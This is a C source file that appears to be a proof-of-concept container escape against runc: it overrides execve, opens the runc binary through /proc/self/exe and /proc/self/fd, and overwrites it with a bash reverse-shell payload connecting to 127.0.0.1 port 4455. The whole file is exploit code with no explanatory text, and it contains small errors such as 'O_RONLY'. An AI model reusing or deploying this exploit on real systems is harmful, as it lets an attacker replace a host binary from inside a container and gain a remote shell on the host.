#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define SELF_FD_FMT "/proc/self/fd/%d"
#define PAYLOAD "#!/bin/bash\n/bin/bash -i >& /dev/tcp/127.0.0.1/4455 0>&1"
#define TIMES 99999

typedef ssize_t (*execve_func_t)(const char* filename, char* const argv[], char* const envp[]);
static execve_func_t old_execve = NULL;

int write_runc(int fdd) {
    int i, ret;
    char dest[512];
    char line[512];

    FILE *cmdline = fopen("/proc/self/cmdline", "r");
    fgets(line, sizeof(line), cmdline);
    fclose(cmdline);
    if (strstr(line, "runc") == NULL) {
        puts(line);
        return -1;
    }

    for (i = 0; i < TIMES; i++) {
        if (fdd >= 0) {
            printf("Successfuly opened at fd %d\n", fdd);
            snprintf(dest, 500, SELF_FD_FMT, fdd);
            puts(dest);
            for (i = 0; i < TIMES; i++) {
                int fd = open(dest, O_WRONLY | O_TRUNC);
                if (fd >= 0) {
                    printf("Successfully openned runc binary as WRONLY\n");
                    ret = write(fd, PAYLOAD, strlen(PAYLOAD));
                    if (ret > 0) printf("Payload deployed\n");
                    return 0;
                }
            }
            return -1;
        }
    }
    if (i > TIMES) {
        return -1;
    }
    return 0;
}

int execve(const char* filename, char* const argv[], char* const envp[]) {
    printf("Running hook\n");
    int fd = open("/proc/self/exe", O_RONLY);
    if (fork() == 0) {
        return write_runc(fd);
    } else {
        old_execve = dlsym(RTLD_NEXT, "execve");
        return old_execve(filename, argv, envp);
    }
}
